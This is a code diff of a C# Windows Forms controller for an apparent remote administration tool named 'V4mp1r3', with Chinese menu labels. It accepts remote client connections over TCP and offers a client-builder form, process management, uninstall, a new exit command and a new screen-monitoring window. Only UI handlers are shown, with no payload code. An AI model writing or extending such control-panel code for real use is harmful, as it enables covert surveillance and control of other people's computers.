@@ -52,7 +52,7 @@ namespace V4mp1r3
             }
             listener = new TcpListener(port);
             listener.Start();
-            while (true)
+            while(true)
             {
                 client = listener.AcceptTcpClient();
                 string address = client.Client.RemoteEndPoint.ToString();
@@ -102,8 +102,8 @@ namespace V4mp1r3
 
         private void 服务端生成ToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            frmServerMaker frmServerMaker = new frmServerMaker();
-            frmServerMaker.ShowDialog();
+            frmClientMaker frmClientMaker = new frmClientMaker();
+            frmClientMaker.ShowDialog();
         }
 
         private void listView1_MouseUp(object sender, MouseEventArgs e)
@@ -112,7 +112,7 @@ namespace V4mp1r3
             {
                 ListView listView = (ListView)sender;
                 ListViewItem item = listView.GetItemAt(e.X, e.Y);
-                if (item != null && listView1.SelectedItems[0].SubItems[2].Text != "下线" && listView1.SelectedItems[0].SubItems[2].Text != "已断开")
+                if(item != null && listView1.SelectedItems[0].SubItems[2].Text != "下线" && listView1.SelectedItems[0].SubItems[2].Text != "已断开")
                 {
                     contextMenuStrip1.Show(listView, e.X, e.Y);
                 }
@@ -141,23 +141,6 @@ namespace V4mp1r3
         {
             frmV4mp1r3 frmV4mp1r3 = new frmV4mp1r3();
             frmV4mp1r3.ShowDialog();
-        }
-
-        private void 断开连接ToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            int id;
-            id = Int32.Parse(listView1.SelectedItems[0].Text);
-            try
-            {
-                NetworkStream clientStream = clientlist[id].GetStream();
-                BinaryWriter bw = new BinaryWriter(clientStream);
-                bw.Write("disconnect");
-            }
-            catch
-            {
-                MessageBox.Show("远程主机已断开连接！", "提示");
-            }
-            listView1.Items[id - 1].SubItems[2].Text = "已断开";
         }
 
         private void 卸载ToolStripMenuItem_Click(object sender, EventArgs e)
@@ -196,6 +179,31 @@ namespace V4mp1r3
             id = Int32.Parse(listView1.SelectedItems[0].Text);
             frmProccessManage frmProccessManage = new frmProccessManage(clientlist[id]);
             frmProccessManage.ShowDialog();
+        }
+
+        private void 退出ToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            int id;
+            id = Int32.Parse(listView1.SelectedItems[0].Text);
+            try
+            {
+                NetworkStream clientStream = clientlist[id].GetStream();
+                BinaryWriter bw = new BinaryWriter(clientStream);
+                bw.Write("exit");
+            }
+            catch
+            {
+                MessageBox.Show("远程主机已断开连接！", "提示");
+            }
+            listView1.Items[id - 1].SubItems[2].Text = "下线";
+        }
+
+        private void 屏幕监控ToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            int id;
+            id = Int32.Parse(listView1.SelectedItems[0].Text);
+            frmSreenMonitor frmSreenMonitor= new frmSreenMonitor(clientlist[id]);
+            frmSreenMonitor.ShowDialog();
         }
     }
 }
